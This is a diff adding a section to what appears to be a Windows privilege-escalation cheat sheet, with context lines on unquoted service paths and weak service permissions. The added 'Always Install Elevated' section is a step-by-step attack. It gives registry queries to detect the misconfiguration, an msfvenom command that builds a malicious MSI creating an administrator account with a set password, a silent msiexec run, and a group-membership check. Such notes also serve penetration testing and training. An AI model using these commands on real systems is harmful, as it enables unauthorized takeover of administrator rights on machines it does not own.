@@ -185,6 +185,23 @@ When you will open you will have evil to administrators groups:
 * after restart you will have nc listener.
 
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+## Always Install Elevated
+* use the commands and if they return output then vulnerability exists:
+  * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+  * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+  * reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+  
+  * Generate a msi file: 
+    * msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
+   
+  * Upload to machine
+  * run the msi:
+    * msiexec /quiet /qn /i C:\<path>\1.msi
+
+  * net localgroup administrators
+  * users should exists
+
 ## Insecure Service Permissions
 * Detect is to find a service with weak permissions
   * accesschk.exe -uwcqv *
